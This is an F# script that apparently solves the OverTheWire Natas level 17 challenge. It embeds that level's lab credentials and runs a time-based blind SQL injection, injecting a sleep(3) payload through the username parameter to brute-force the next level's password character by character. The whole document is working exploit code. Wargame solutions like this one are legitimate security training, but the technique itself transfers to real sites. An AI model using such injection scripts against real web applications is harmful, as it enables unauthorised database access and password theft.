open System
open System.Net

let url = "http://natas17.natas.labs.overthewire.org/"
let credentials = "natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let check passwordClause =
    let fullUrl = sprintf "%s?username=natas18\" and password like binary \"%s\" and username <> sleep(3) -- " url passwordClause
    let http = HttpWebRequest.CreateHttp fullUrl
    http.Headers.Add(basicAuth)

    let start = DateTime.Now
    ignore (http.GetResponse ())
    DateTime.Now.Subtract(start).TotalSeconds > 3.

let chars = Array.concat [[|'a'..'z'|]; [|'A'..'Z'|]; [|'0'..'9'|]] 

printfn "calculating valid characters from set of %i..." chars.Length
let valid = 
    chars |> Array.filter (fun c -> check ("%" + string c + "%"))
printfn "found %i characters. proceeding with bruteforce..." valid.Length

let rec blindFinder soFar =
    let toTest = valid |> Array.map (fun c -> soFar + string c)
    let next = toTest |> Array.find (fun s -> check (s + "%"))
    printfn "%s" next
    if next.Length = 32 then 
        printfn "natas18's password: %s" next
    else
        blindFinder next

blindFinder ""